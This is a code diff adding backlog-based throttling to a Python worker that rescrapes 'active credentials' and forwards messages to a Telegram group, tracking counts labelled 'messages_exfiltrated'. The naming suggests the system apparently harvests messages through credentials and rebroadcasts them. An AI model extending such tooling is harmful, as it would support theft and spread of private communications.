@@ -1029,6 +1029,41 @@ def rescrape_active():
     from app.workers.celery_app import get_worker_loop
     return get_worker_loop().run_until_complete(_rescrape_active_logic())
 
+def _rescale_for_backlog(pending: int, batch: int, spread: int) -> tuple[int, int, bool]:
+    """Shrink (or skip) a rescrape cycle as the delivery backlog grows.
+
+    Telegram caps how fast one group accepts messages; scraping faster than we
+    can deliver only grows the queue and ages out media. Returns
+    ``(batch, spread, skip)``.
+    """
+    pause_at = int(os.getenv("RESCRAPE_BACKLOG_PAUSE", "40000"))
+    high_water = int(os.getenv("RESCRAPE_BACKLOG_HIGH", "25000"))
+    if pending >= pause_at:
+        return 0, spread, True
+    if pending >= high_water:
+        return max(5, batch // 5), spread * 2, False
+    return batch, spread, False
+
+
+async def _pending_backlog() -> int:
+    """Cheap backlog estimate from the once-a-minute monitor_stats row."""
+    try:
+        res = await async_execute(
+            db.table("monitor_stats")
+            .select("messages_exfiltrated,messages_broadcasted")
+            .limit(1)
+        )
+        rows = res.data or []
+        if not rows:
+            return 0
+        total = int(rows[0].get("messages_exfiltrated") or 0)
+        sent = int(rows[0].get("messages_broadcasted") or 0)
+        return max(0, total - sent)
+    except Exception as exc:  # noqa: BLE001 - never block scraping on stats
+        logger.debug(f"[Rescrape] backlog estimate failed: {exc}")
+        return 0
+
+
 async def _rescrape_active_logic():
     """
     Cursor-based rescrape: advances through ALL active credentials across successive runs.
@@ -1054,6 +1089,22 @@ async def _rescrape_active_logic():
     # Default: 2 × BATCH_SIZE (allow one overlap batch in flight, then gate).
     BACKPRESSURE_THRESHOLD = int(os.getenv("RESCRAPE_BACKPRESSURE_THRESHOLD", BATCH_SIZE * 2))  # noqa: N806 — function-scoped constant
     CURSOR_KEY = "rescrape:cursor:last_id"  # noqa: N806 — function-scoped constant
+
+    pending = await _pending_backlog()
+    BATCH_SIZE, SPREAD_SECONDS, skip_cycle = _rescale_for_backlog(  # noqa: N806
+        pending, BATCH_SIZE, SPREAD_SECONDS
+    )
+    if skip_cycle:
+        logger.warning(
+            f"[Rescrape] skipping cycle: {pending} messages queued for delivery "
+            f"(pause threshold {os.getenv('RESCRAPE_BACKLOG_PAUSE', '40000')})"
+        )
+        metrics.inc("rescrape.skipped_backlog")
+        return f"Rescrape skipped: backlog {pending}"
+    if pending >= int(os.getenv("RESCRAPE_BACKLOG_HIGH", "25000")):
+        logger.info(
+            f"[Rescrape] backlog {pending}: batch {BATCH_SIZE}, spread {SPREAD_SECONDS}s"
+        )
 
     broadcaster = get_broadcaster()
 
